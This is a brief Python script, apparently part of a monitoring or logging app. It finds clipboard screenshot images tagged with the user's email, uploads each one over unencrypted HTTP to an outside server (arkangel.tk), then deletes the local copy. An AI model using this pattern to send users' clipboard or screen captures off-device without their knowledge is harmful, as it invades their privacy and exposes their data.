import requests
import json
import os
from getsqldata import *
from datetime import datetime

uid = getCurrentUser()

##st = getRowValue("Setting",uid)
email = getRowValue('Users',uid)[1]
##token = getRowValue('current_user',uid)[1]
dir_path = '..\\Clipboard'#getRowValue('Setting',uid)

#up screenshot image log
#path = os.path.join(dir_path[3],'Clipboard')
path = os.path.abspath(dir_path)
print(path)

for file in os.listdir(path):
    if file.endswith(email+".jpeg"):
        filePath = os.path.join(path, file)
        print(filePath)
        urlscr = 'http://www.arkangel.tk/upload-clipboard-image'
        with open(filePath,'rb') as filedata:
            r = requests.post(urlscr,files={'file':filedata})
        #if upload successful, rename file
        if(r.content == b''):
            print('successs')
            os.remove(filePath)
